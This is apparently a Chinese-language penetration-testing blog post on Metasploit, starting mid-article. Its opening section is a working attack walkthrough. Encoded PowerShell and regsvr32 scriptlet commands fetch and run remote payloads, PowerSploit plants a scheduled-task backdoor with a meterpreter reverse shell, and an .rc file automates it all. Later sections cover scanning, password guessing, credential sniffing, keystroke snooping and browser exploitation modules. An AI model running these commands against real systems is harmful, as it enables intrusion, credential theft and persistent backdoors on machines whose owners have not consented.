<pre><code>set autorunscript &#39;multicommand -cl &quot;powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUgBpAGQAdABlAHIALwBQAGUAbgB0AGUAcwB0AC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8ARABlAG0AbwBTAGgAZQBsAGwALwBzAGMAaAB0AGEAcwBrAHMALgBwAHMAMQAnACkAOwAKAA==&quot;&#39;
</code></pre><p>演示如下：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/2066d69233e0b457b592.gif" alt=""></p>
<p>现在我们就在获取meterpreter会话之后，绕过拦截自动创建了计划任务，至于怎么样使用计划任务创建一个后门，其实已经有了现成的powershell脚本。请看拓展。</p>
<h3 id="0x05-拓展"><a href="#0x05-拓展" class="headerlink" title="0x05 拓展"></a>0x05 拓展</h3><p><strong>PowerSploit</strong> 是一个Powershell的渗透框架，其中含有Persistence模块，不知道小伙伴没有没有测试过。具体怎么使用这里就不详细介绍了，有兴趣可是看一下里面的Help信息。</p>
<p>1、首先，生成一个自动创建计划任务后门的脚本：</p>
<p>加载Persistence模块：</p>
<pre><code>PS C:/Persistence&gt; Import-Module ./Persistence.psm1
</code></pre><p>因为常常我们希望在没有最高权限的情况下创建后门，为了避免杀软，尽量不使用添加注册表的方式，所以，这里依然使用计划任务的方式来创建，执行时间是计算机空闲状态执行。具体命令如下：</p>
<pre><code>PS C:/Persistence&gt; $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
PS C:/Persistence&gt; $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
PS C:/Persistence&gt; Add-Persistence -FilePath ./evil.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
</code></pre><p>可以看脚本说明更改触发条件</p>
<p>evil.ps1是计划任务要执行的payload，可以使用以下命令来生成。</p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.2.101 lport=7777 -f psh-reflection -o evil.ps1
</code></pre><p>最终生成脚本如下：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/0ab06870e2d0193fa1d0.png" alt=""></p>
<p>2、测试脚本功能：</p>
<p>将Persistence.ps1 脚本放到web上通过IEX来加载。创建成功以后当电脑空闲时，会执行命令，从而产生meterpreter会话。</p>
<p>测试方式为执行以下命令：</p>
<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://domain.com/Persistence.ps1&#39;); &quot;
</code></pre><p>在这里发现一个小BUG，运行脚本的时候，执行的POWERSHELL对话框并不会隐藏，解决方式是修改PERSISTENCE.PS1 ，找到POWERSHELL.EXE -NONINTERACTIVE 并添加 -W HIDDEN 参数。如果有已经有了CMD权限，可以直接执行此命令添加计划任务后门，这里设置为获取METERPRETER之后自动执行是为了在通过某些其他漏洞获取METERPRETER会话之后自动创建计划任务后门。</p>
<p>测试发现脚本可以实现我们想要的功能。</p>
<p>3、构造Autorunscript命令：</p>
<p>现在要做的就是把Auturunscript以及Persistence.ps1相结合使用，由于命令中存在引号，可以根据前文中提到的方式进行编码处理。但是，经过测试，按照上文中的方式执行是有问题的，multicommand执行会等待程序执行结束并获取执行结果，这样一来，由于执行的进程不会退出且无回显，所以，会导致程序报错！</p>
<p>多次测试以后，找到了解决方式，即使用<a href="http://drops.wooyun.org/tips/15124所讲的方式。" target="_blank" rel="external">http://drops.wooyun.org/tips/15124所讲的方式。</a></p>
<p>构造sct文件如下：</p>
<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
    progid=&quot;ShortJSRAT&quot;
    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
    &lt;!-- Learn from Casey Smith @subTee --&gt;
    &lt;script language=&quot;JScript&quot;&gt;
        &lt;![CDATA[
            rat = &quot;base64codes&quot;
            ps  = &quot;cmd.exe /c powershell -window hidden -enc &quot;
            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps + rat,0,true);

        ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre><p>将以上内容命名为test.jpg并放到web服务器上（替换掉base64codes），之后执行</p>
<pre><code>regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll
</code></pre><p>与执行powershell的命令是等价的。并且会通过regsvr32开启新的进程而不影响multicommand的执行。</p>
<p>所以最终要设置的内容为：</p>
<pre><code>set autorunscript &#39;multicommand -cl &quot;regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll&quot;&#39;
</code></pre><p>当获取meterpreter会话以后，自动执行命令安装后门：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/fc803d5c067056b0ad99.png" alt=""></p>
<p>这样，两者就完美的结合了。重启以后，空闲状态时，脚本执行，重新获取meterpreter会话。这里就不截图了。</p>
<p>以上命令可写入rc文件方便运行：</p>
<pre><code>payload.rc：
</code></pre><pre><code>use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.2.101
set lport 6666
set uripath /
set ExitOnSession false
set autorunscript &#39;multicommand -cl &quot;regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll&quot;&#39;
exploit -j
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.2.101
set lport 7777
set ExitOnSession false
exploit -j
</code></pre><p>自己配置修改相关选项</p>
<h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><h1 id="模块使用"><a href="#模块使用" class="headerlink" title="模块使用"></a>模块使用</h1><h1 id="系统部分"><a href="#系统部分" class="headerlink" title="系统部分"></a>系统部分</h1><h2 id="活跃主机扫描"><a href="#活跃主机扫描" class="headerlink" title="活跃主机扫描"></a>活跃主机扫描</h2><p><em>Metasploit主机发现模块</em></p>
<p>模块位于源码路径的modules/auxiliary/scanner/discovery/  </p>
<p>主要有</p>
<pre><code>arp_sweep
ipv6_mulitcast_ping
ipv6_neighbor
ipv6_neighbor_router_advertisement
udp_probe
udp_sweep
</code></pre><ul>
<li>arp_sweep使用arp请求枚举本地局域网中的所有活跃主机</li>
<li>udp_sweep通过发送UDP数据包探查指定主机是否活跃，并发现主机上的udp服务。</li>
</ul>
<hr>
<p><strong>arp_sweep模块使用方法</strong></p>
<pre><code>&gt; use auxiliary/scanner/discovery/arp_sweep
&gt; show options
</code></pre><ol>
<li>首先输入RHOSTS设置扫描目标 //大部分RHOSTS可以设置一个或多个IP，多个IP之间使用连字符“-”表示。</li>
</ol>
<pre><code>&gt; set RHOSTS 10.10.10.0/24
&gt; set THREADS 50
&gt; run
</code></pre><ol>
<li>设置好参数后输入run启动扫描器</li>
</ol>
<hr>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>可以输入如下命令找到相关扫描器</p>
<pre><code>&gt; search portscan
</code></pre><p>返回</p>
<pre><code>auxiliary/scanner/protscan/ack //通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测 
auxiliary/scanner/protscan/ftpbounce //通过FTP bounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能很好的防范此攻击，但在旧的系统上仍可以被利用
auxiliary/scanner/protscan/syn  //使用发送TCP SYN标志的方式探测开放端口
auxiliary/scanner/protscan/tcp  //通过一次完整的TCP连接来判断端口是否开放 最准确但是最慢
auxiliary/scanner/protscan/xmas  //一种更为隐秘的扫描方式，通过发送FIN，PSH，URG标志，能够躲避一些高级的TCP标记检测器的过滤
</code></pre><p><em>一般情况下推荐使用syn端口扫描器，速度较快，结果准确，不易被对方察觉</em></p>
<p><strong>syn扫描器的使用</strong></p>
<pre><code>&gt; use auxiliary/scanner/protscan/syn
&gt; set RHOSTS 10.10.10.10/254
&gt; set THREADS 20
&gt; run
</code></pre><hr>
<h2 id="服务扫描与查点"><a href="#服务扫描与查点" class="headerlink" title="服务扫描与查点"></a>服务扫描与查点</h2><p><em>确定开放端口后，对相应端口上锁运行的服务信息进行挖掘</em></p>
<p>在Metasploit的Scanner辅助模块中，用于服务扫描和查点的工具常以</p>
<pre><code>[service_name]_version
</code></pre><p>和</p>
<pre><code>[service_name]_login
</code></pre><p>命名</p>
<ul>
<li>[service_name]_version 可用于遍历网络中包含了某种服务的主机，并进一步确定服务的版本。</li>
<li>[service_name]_login 可对某种服务进行口令探测攻击</li>
</ul>
<p>在msf终端中可以输入：</p>
<pre><code>search name:_version
</code></pre><p>查看所有可用的服务查点模块</p>
<hr>
<h2 id="常见网络服务扫描"><a href="#常见网络服务扫描" class="headerlink" title="常见网络服务扫描"></a>常见网络服务扫描</h2><p><strong>Telnet服务扫描</strong></p>
<pre><code>&gt; use auxiliary/scanner/telnet/telnet_version
&gt; set RHOSTS　xxx.xxx.xxx/24
&gt; set THREADS 100
&gt; run
</code></pre><p><strong>SSH服务扫描</strong></p>
<pre><code>&gt; use auxiliary/scanner/ssh/ssh_version
&gt; set RHOSTS xx.xx.xx.x/24
&gt; set THREADS 100
&gt; run
</code></pre><p><strong>Oracle数据库服务查点</strong></p>
<pre><code>&gt; use auxiliary/scanner/oracle/tnslsnr_version
&gt; set RHOSTS xx.xx.xx.xx/24
&gt; set THREADS 50
&gt; run
</code></pre><p><strong>smb服务扫描</strong></p>
<pre><code>&gt; msf&gt; use auxiliary/scanner/smb/smb_version 
&gt; show options 
&gt; set RHOSTS 192.168.1.111 
&gt; run 
&gt; db_hosts –c address,os_flavor 
</code></pre><p><strong>查找mssql 主机</strong></p>
<pre><code>&gt; msf&gt; use auxiliary/scanner/mssql/mssql_ping 
&gt; show options 
&gt; set RHOSTS 192.168.1.0/24 
&gt; set THREADS 255 
&gt; run 
</code></pre><p><strong>FTP 主机扫描</strong><br>    msf&gt; use auxiliary/scanner/ftp/ftp_version </p>
<pre><code>&gt; show options 
&gt; set RHOSTS 192.168.1.0/24 
&gt; set THREADS 255 
&gt; run 
</code></pre><p><strong>扫描FTP 匿名登录</strong> </p>
<pre><code>&gt; use auxiliary/scanner/ftp/anonymos 
&gt; set RHOSTS 192.168.1.0/24 
&gt; set THREADS 50 
&gt; run
</code></pre><p><strong>扫描SNMP 主机</strong></p>
<pre><code>msf&gt; use auxiliary/scanner/snmp/snmp_login 
&gt; set RHOSTS 192.168.1.0/24 
&gt; set THREADS 50 
&gt; run
</code></pre><p><strong>开放代理探测辅助模块</strong></p>
<p><em>Metasploit提供了open_proxy模块，可以方便的获取免费的HTTP代理服务器地址，用来隐藏真实ip</em></p>
<pre><code>&gt; use auxiliary/scanner/http/open_proxy
&gt; set SITE www.google.com
&gt; set RHOSTS 24.25.24.1-24.25.26.254
&gt; set MULTIPORTS true
&gt; set VERIFY_CONNECT true
&gt; set THREADS 100
&gt; run
</code></pre><hr>
<h2 id="口令猜测与嗅探"><a href="#口令猜测与嗅探" class="headerlink" title="口令猜测与嗅探"></a>口令猜测与嗅探</h2><p><strong>SSh服务弱口令猜测</strong></p>
<pre><code>&gt; use auxiliary/scanner/ssh/ssh_login
&gt; set RHOSTS 10.10.10.254
&gt; set USERNAME root
&gt; set PASS_FILE /root/words.txt
&gt; set THREADS 50
&gt; run
</code></pre><p><strong>psnuffle口令嗅探</strong></p>
<p><em>可以截获常协议的身份认证过程，并将用户名和口令信息记录下来</em></p>
<pre><code>&gt; use auxiliary/sniffer/psunffle
&gt; run
</code></pre><p>实际使用中，只有在得到能够介入对方网络的初始访问点之后，才能使用此模块进行口令嗅探。</p>
<hr>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ol>
<li>与漏洞扫描器结合扫描</li>
<li>特殊扫描:</li>
</ol>
<p><strong>SMB 弱口令</strong> </p>
<pre><code>msf&gt; use auxiliary/scanner/smb/smb_login 
&gt; set RHOSTS 192.168.1.111-222 
&gt; set SMBUser Administrator 
&gt; set SMBPass admin 
&gt;run 
</code></pre><p>VNC 空口令： </p>
<pre><code>msf&gt; use auxiliary/scanner/vnc/vnc_none_auth 
&gt; set RHOSTS 192.168.1.111 
&gt; run 
</code></pre><p>Open X11 空口令： </p>
<pre><code>msf&gt; use auxiliary/scanner/x11/open_x11 
&gt; set RHOST 192.168.1.0/24 
&gt; set THREADS 50 
&gt; run
</code></pre><p>当扫描到此漏洞的主机后可以使用xspy 工具来监视对方的键盘,输入： </p>
<pre><code>cd /pentest/sniffers/xspy/ 
./xspy –display 192.168.1.125:0 –delay 100 
</code></pre><hr>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p><em>Metasploit支持使用数据库来保存渗透测试过程中获取的各种数据</em></p>
<p><strong>Metasploit的数据库支持</strong></p>
<pre><code>root@kali:~# service postgresql start//开启postgresql数据库
root@kali:~# msfdb init//初始化msf数据库
</code></pre><p>//输入如下命令，查看默认安装的PostgreSQL数据库默认管理员口令：</p>
<pre><code>cat /opt/metasploit/properties.ini | grep &quot;postgres_root_password&quot; postgres_root_password=84cd2bcf
</code></pre><p><strong>在Metasploit中使用PostgreSQL</strong></p>
<p><em>第一次运行msfconsole时，Metasploit会创建名称为msf3dev的PostgreSQL数据库，并生成保存渗透测试数据所需的数据表，然后使用名称为msf3的用户，自动连接到msf3数据库</em></p>
<p>查看数据库的连接状态：</p>
<pre><code>&gt; db_status
[*] postgresql connected to msf3dev //说明数据库连接正常
</code></pre><p><strong>连接到其他数据库</strong></p>
<p><em>每次msfconsole启动时，会自动连接到msf3dev数据库，连接到其他数据库应用db_connect命令</em></p>
<pre><code>msf &gt; db_connect 用户名:口令@服务器地址:端口/数据库名称
</code></pre><p>用户名为postgres，口令如上在/opt/metasploit/properties.ini中查找</p>
<p>输入db_connect连接</p>
<pre><code>msf &gt; dv_connect postgress:84cd2bcf@localhost:7337/msf4
</code></pre><p>连接到数据库后，可以使用hosts命令检查数据库是否可以正常使用。</p>
<pre><code>msf &gt; hosts
Hosts
=====
address mac name os_name os_flavor os_sp purpose info comments
</code></pre><p>删除一个数据库：</p>
<pre><code>/opt/framework/metasploit/bin/dropdb msf4
password:
</code></pre><p>断开数据库连接：</p>
<pre><code>msf &gt; db_disconnect
</code></pre><p><strong>Nmap连接渗透测试数据库</strong></p>
<pre><code>msf &gt; db_nmap -Pn -sV  10.10.10.0/24
</code></pre><p>该命令是Nmap的一个封装，与Nmap使用方法一样，其执行结果会自动输入到数据库当中</p>
<p>也可以将Nmap扫描结果导出为一个输出文件，并导入渗透测试数据库中，只要在Nmap命令中加入-oX参数</p>
<pre><code>nmap -Pn -sV -oX dmz 10.10.10.0/24
</code></pre><p>扫描结束后，在当前目录下生成名为dmz的文件，可以在msf终端中导入数据库中</p>
<pre><code>msf &gt; db_import /root/dmz
</code></pre><p> // db_import命令还能识别Acunetix，Amap，Appscan，Burp Session，Microsoft Baseline Security Analyzer,Nessus,NetSparker,NeXpose,OpenVAS Report,Rentina 等扫描器的结果</p>
<p><strong>OpenVAS连接渗透测试数据库</strong></p>
<pre><code>首先载入OpenVAS插件，并连接到PoenVAS管理引擎
msf &gt; load openvas
msf &gt; openvas_connect admin your_openvas_passwd 10.10.10.128 9390 ok
</code></pre><p>找到想要导入的扫描报告，导入数据库中<br>*Metasploit之支持导入NBE格式的扫描报告，导入前需要使用openvas_format_list查找NBE格式的ID号</p>
<pre><code>msf &gt; openvas_report_list
msf &gt; openvas_format_list
msf &gt; openvas_report_import 2 4
</code></pre><p><strong>共享渗透测试信息数据库</strong></p>
<ul>
<li style="list-style: none"><input type="checkbox"> waiting</li>
</ul>
<hr>
<h1 id="Web部分"><a href="#Web部分" class="headerlink" title="Web部分"></a>Web部分</h1><p><em>Web应用辅助扫描，漏洞查找等模块基本都在 modules/auxiliary/ 下，Metasploit内置了wmap WEB扫描器</em></p>
<ul>
<li>辅助模块<h2 id="wmap"><a href="#wmap" class="headerlink" title="wmap"></a>wmap</h2><em>要先创建一个数据库用来存放扫描数据</em></li>
</ul>
<p><strong>初始化wmap</strong></p>
<pre><code>msf &gt; load wmap
msf &gt; help
wmap Commands
=============

Command       Description
-------       -----------
wmap_modules  Manage wmap modules
wmap_nodes    Manage nodes
wmap_run      Test targets
wmap_sites    Manage sites
wmap_targets  Manage targets
wmap_vulns    Display web vulns
</code></pre><p><strong>使用wmap扫描</strong></p>
<pre><code>msf &gt; wmap_sites -a http://202.112.50.74  //添加要扫描的网站
msf &gt; wmap_sites -l
msf &gt; wmap_targets -t http://202.112.20.74 //只能添加ip地址 //把添加的网站作为扫描目标
msf &gt; wmap_run -t   //查看那些模块将在扫描中使用
msf &gt; wmap_run -e   //开始扫描
msf &gt; vulns     //查看漏洞信息
</code></pre><hr>
<ul>
<li>渗透模块</li>
</ul>
<p><em>Metasploit针对Web应用的渗透模块分赛在module中的多个文件中下，主要集中在</em></p>
<pre><code>exploit/unix/webapp
exploit/windows/http
exploit/multi/http
</code></pre><hr>
<h2 id="网站信息查询"><a href="#网站信息查询" class="headerlink" title="网站信息查询"></a>网站信息查询</h2><p>搜索网站目录</p>
<p><strong>dir_scanner</strong></p>
<pre><code>msf&gt; use auxiliary/scanner/http/dir_scanner
msf&gt;set THERADS 50
msf&gt;set RHOSTS www.testfire.net
msf&gt;exploit
</code></pre><p><strong>搜索网站中的email地址</strong></p>
<pre><code>msf&gt; use auxiliary/gather/search_email_collector
&gt;set DOMAIN altoromutual.com
&gt;altoromutual.com
&gt;run
</code></pre><hr>
<h2 id="XSSF"><a href="#XSSF" class="headerlink" title="XSSF"></a>XSSF</h2><p><em>一个跨站脚本攻击框架</em></p>
<ul>
<li>首先下载最新的XSSF程序，解压压缩包，把四个文件夹合并到/opt/framework/msf3 中</li>
</ul>
<p>加载xssf</p>
<pre><code>msf &gt; load xssf
</code></pre><p>查看基本配置信息</p>
<pre><code>msf &gt; xssf_urls
</code></pre><p>查看受到攻击的主机的信息</p>
<pre><code>msf &gt; xssf_victims
</code></pre><p>//状态为true的是最近的一次攻击成功的信息</p>
<p>查看被攻击主机的信息</p>
<pre><code>msf &gt; xssf_information 4
目标浏览器为IE6.0
</code></pre><p>选择相关模块进行攻击</p>
<pre><code>msf &gt; use auxiliary/server/browser_autopwn
    &gt; set LHOST 10.10.10.128
    &gt; set SRVHOST 10.10.10.128
    &gt; set SRVPORT 8080
    &gt; exploit
</code></pre><p>查看可以被利用的模块信息</p>
<pre><code>    &gt; jobs
</code></pre><p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>

    

    
</div>


                

                <!-- Post Comments -->
                
                    
    <!-- 使用 DISQUS_CLICK -->
<div id="disqus-comment">
    <div id="disqus_thread"></div>

<!-- add animation -->
<style>
	.disqus_click_btn {
            line-height: 30px;
            margin: 0;
            min-width: 50px;
            padding: 0 14px;
            display: inline-block;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 0;
            overflow: hidden;
            will-change: box-shadow;
            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
            outline: 0;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            vertical-align: middle;
            border: 0;
            background: rgba(158, 158, 158, .2);
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
            color: #fff;
            background-color: #D3D3D3;
            text-shadow: 0
        }
</style>
	
<div class="btn_click_load"> 
    <button class="disqus_click_btn">阅读评论（请确保 disqus 可以正常加载）</button>
</div>

<script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'https://ares-x.com/2017/07/29/Metasploit基础使用/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'https://ares-x.com/2017/07/29/Metasploit基础使用/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
</script>

<script type="text/ls-javascript" id="disqus-lazy-load-script">
    $('.btn_click_load').click(function() {  //click to load comments
        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document;
            var s = d.createElement('script');
            s.src = '//ares-x-com.disqus.com/embed.js';
            s.setAttribute('data-timestamp', + new Date());
            (d.head || d.body).appendChild(s);
        })();
        $('.btn_click_load').css('display','none');
    });
</script>
  	

</div>
<style>
    #disqus-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>

                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    
        <a href="/2017/07/29/Parrot系统初始配置/" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            新篇
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2017/07/28/hello-world/" id="post_nav-older" class="next-content">
            旧篇
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(https://cache-1253916356.file.myqcloud.com/img/sidebar.jpg);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" alt="AresX's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        aresx@protonmail.com
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="mailto: aresx@protonmail" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/">
                
                主页
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    归档
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
                <a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">九月 2017<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">6</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
                
                分类
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
                <li>
                <a class="sidebar_archives-link" href="/categories/CTF/">CTF<span class="sidebar_archives-count">9</span></a></li><li><a class="sidebar_archives-link" href="/categories/In-My-Heart/">In My Heart<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/屠龙之技/">屠龙之技<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/杂文/">杂文<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透不测试/">渗透不测试<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/categories/编程无道/">编程无道<span class="sidebar_archives-count">2</span></a>
            </ul>
        </li>
        
    

    <!-- Pages  -->
    
        <li>
            <a href="/timeline" title="时间轴">
                
                    <i class="material-icons sidebar-material-icons">sort</i>
                
                时间轴
            </a>
        </li>
        
            <li class="divider"></li>
        
    
        <li>
            <a href="/about" title="关于我">
                
                    <i class="material-icons sidebar-material-icons">person</i>
                
                关于我
            </a>
        </li>
        
    
        <li>
            <a href="/links" title="友链">
                
                友链
            </a>
        </li>
        
    

    <!-- Article Number  -->
    
        <li>
            <a href="/archives">
                文章总数
                <span class="sidebar-badge">31</span>
            </a>
        </li>
        
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->

    <div class="sidebar-divider"></div>


<!-- Theme Material -->


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div id="back-to-top" class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    
        <a href="https://twitter.com/twitter" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
                <span class="visuallyhidden">Twitter</span>
            </button><!--
     --></a>
    

    <!-- Facebook -->
    

    <!-- Google + -->
    

    <!-- Weibo -->
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
        <a href="https://t.me/Axxxxk" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-telegram">
                <span class="visuallyhidden">Telegram</span>
            </button><!--
     --></a>
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©&nbsp;2017&nbsp;-<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>AresX's Blog
        </div>

        <!-- Paradox Footer Right Section -->

        <!--
        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
        It will not impact the appearance and can give developers a lot of support :)

        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
        它不会影响美观并可以给开发者很大的支持。 :)
        -->

        <div class="mdl-mini-footer--right-section">
            <div>
                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
            </div>
        </div>
    
</footer>



                    <!-- Import File -->


    <script>lsloader.load("js/lazyload.min.js","https://cache-1253916356.file.myqcloud.com/js/lazyload.min.js")</script>
    <script>lsloader.load("js/js.min.js","https://cache-1253916356.file.myqcloud.com/js/js.min.js")</script>



    <script>lsloader.load("js/nprogress.js","https://cache-1253916356.file.myqcloud.com/js/nprogress.js")</script>


<script type="text/ls-javascript" id="NProgress-script">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>







    <!-- Busuanzi -->
    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



   <!-- 使用 DISQUS js 代码 -->






<!-- UC Browser Compatible -->
<script>
	var agent = navigator.userAgent.toLowerCase();
	if(agent.indexOf('ucbrowser')>0) {
		document.write('<link rel="stylesheet" href="/css/uc.css">');
	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
	}
</script>

<!-- Window Load-->
<script type="text/ls-javascript" id="window-load">
    $(window).on('load', function() {
        // Post_Toc parent position fixed
